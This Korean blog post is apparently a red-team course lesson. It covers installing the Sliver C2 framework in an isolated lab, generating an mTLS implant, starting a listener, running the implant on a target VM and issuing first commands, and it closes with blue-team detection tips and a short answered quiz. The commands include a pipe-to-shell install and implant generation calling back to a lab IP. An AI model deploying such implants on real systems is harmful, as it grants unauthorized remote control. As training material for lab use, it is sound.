---
layout: post
title: "Sliver Week 2: 설치 + 첫 Implant (격리 Lab)"
date: 2026-05-19 11:00:00 +0900
categories: security red-team c2 sliver senior
---

## 학습 목표

- 격리 lab 구성.
- Sliver server + client 설치.
- 첫 implant 생성·실행.
- Blue team: 트래픽 관찰.

## 1. Lab 구성 (필수)

비유: 의사가 시신해부 실습할 때 시체 안치실에서만. lab도 똑같이 격리.

권장 구성:
- VirtualBox/VMware 또는 Proxmox.
- 가상 네트워크 isolated (인터넷 차단).
- Attacker VM (Kali Linux).
- Target VM (Windows 10/Ubuntu).
- Snapshot으로 복원.

**절대로 production / 외부 네트워크에 implant 보내지 말 것.**

## 2. Sliver 설치

```bash
# Kali 또는 Ubuntu (attacker VM)
curl https://sliver.sh/install | sudo bash

# 또는 manual
wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux
chmod +x sliver-server_linux
sudo mv sliver-server_linux /usr/local/bin/sliver-server
```

## 3. Server 시작

```bash
sudo systemctl start sliver
# 또는
sliver-server
```

처음 시작: data dir `~/.sliver/` 생성.

## 4. Client 연결

같은 머신이면:
```bash
sliver-client
```

원격이면 operator config 생성 + 분배:
```bash
sliver-server operator --name alice --lhost 192.168.1.10 --save .
```

`.cfg` 파일을 client에 옮김.

## 5. 첫 Implant 생성

```sliver
sliver > generate --mtls 192.168.1.10:8888 --os linux --arch amd64 --save /tmp/implant
```

`--mtls`: mTLS listener (3주차).
`--os --arch`: target.
`--save`: 출력 경로.

## 6. Listener 시작

```sliver
sliver > mtls --lhost 192.168.1.10 --lport 8888
```

## 7. Target에서 실행 (lab VM!)

```bash
# target VM (이전에 본인이 만든 isolated lab)
chmod +x implant
./implant
```

## 8. Session 확인

```sliver
sliver > sessions

ID   Name      Transport   Remote Address       Hostname    Username   OS
1    LUCKY-CAT mtls        10.0.0.5:51234       lab-target  testuser   linux/amd64
```

## 9. 첫 명령

```sliver
sliver > use 1
sliver (LUCKY-CAT) > whoami
sliver (LUCKY-CAT) > ls
sliver (LUCKY-CAT) > pwd
```

## 10. Blue Team 관점

방어자가 봐야 할 것:
- mTLS 8888 포트 outbound (비정상).
- 알 수 없는 binary 실행.
- 정기 callback traffic (jitter 없이 일정 간격).

EDR/NDR alert 설계의 기초.

## 11. 자가평가

### Q1. Lab 격리의 핵심?
1. **인터넷 차단 + production 분리**
2. UI 3. 빠른 빌드 4. 무관

**정답: 1.**

### Q2. Sliver server 데이터?
1. **~/.sliver/**
2. /etc/sliver 3. /var/sliver 4. 무관

**정답: 1.**

### Q3. Operator config 분배?
1. **.cfg 파일을 client에 복사**
2. UI 입력 3. 무관 4. 자동

**정답: 1.**

### Q4. 첫 implant listener 표준?
1. **mTLS**
2. HTTP 평문 3. UI 4. 무관

**정답: 1.**

### Q5. Blue team 관찰 1?
1. **비정상 outbound + 정기 callback**
2. UI 3. 빠름 4. 무관

**정답: 1.**

## 12. 다음 주차

[Week 3: Listener 종류]에서 4종 listener를 깊게.
